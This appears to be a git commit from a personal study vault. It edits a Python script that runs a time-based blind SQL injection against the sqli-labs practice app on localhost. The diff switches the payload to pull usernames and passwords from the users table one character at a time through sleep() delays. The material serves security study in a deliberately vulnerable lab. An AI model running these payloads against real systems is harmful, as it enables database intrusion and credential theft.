176a552f00aa90943a17ce88c5c62de99dc1008d
wuwumonster <1500177617@qq.com>
2023-02-25 17:06:30 +0800

    vault backup: 2023-02-25 17:06:30
    Affected files:
    .obsidian/workspace.json
    Web/Sql注入/脚本/LESS-15.py

--- Web/Sql注入/脚本/LESS-15.py
+++ Web/Sql注入/脚本/LESS-15.py
@@ -11,21 +11,21 @@ def sql_bool():
     for i in range(1, 1000):
         low = 32
         high = 128
-        payload = "database()"
+        # payload = "database()"
         # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
         # payload = "select group_concat(column_name) from information_schema.columns where table_name='users'"
-        # payload = "select group_concat(concat(username,'~',password)) from users"
+        payload = "select group_concat(concat(username,'~',password)) from users"
 
         while low < high:
             mid = (low + high) // 2
             data = {
                 "uname": "1",
-                "passwd": f"1\" and if(ascii(substr({payload},{i},1))>{mid},sleep(1),0) --+"
+                "passwd": f"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(2),0) --+"
             }
             url = f"http://127.0.0.1:8888/sqli-labs-master/Less-14"
 
             try:
-                res = requests.get(url=url, data=data, timeout=1)
+                res = requests.get(url=url, data=data, timeout=2)
                 high = mid
             except Exception as e:
                 low = mid + 1
